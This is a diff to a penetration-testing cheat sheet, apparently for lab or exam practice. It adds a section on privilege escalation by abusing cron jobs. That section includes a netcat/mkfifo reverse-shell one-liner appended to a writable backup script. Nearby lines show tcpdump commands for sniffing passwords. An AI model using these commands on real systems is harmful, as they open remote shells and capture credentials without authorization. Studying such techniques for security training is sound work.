@@ -66,6 +66,7 @@
 * [Linux Privilege Escalation](#Linux-Privilege-Escalation)
   * [Enumerating Linux](#Enumerating-Linux)
   * [Exposed Confidential Information](#Exposed-Confidential-Information)
+  * [Insecure File Permissions](#Insecure-File-Permissions)
 
 # Tools
 
@@ -1358,4 +1359,25 @@ watch -n 1 "ps -aux | grep pass"
 ~~~ bash
 sudo tcpdump -i lo -A | grep "pass"
 ~~~
+
+
+## Insecure File Permissions
+
+### Abusing Cron Jobs
+
+#### Inspecting the cron log file
+
+~~~ bash
+grep "CRON" /var/log/syslog
+~~~
+
+
+
+#### Inserting a reverse shell one-liner in user_backups.sh
+
+~~~ bash
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.118.2 1234 >/tmp/f" >> user_backups.sh
+~~~
+
+
 
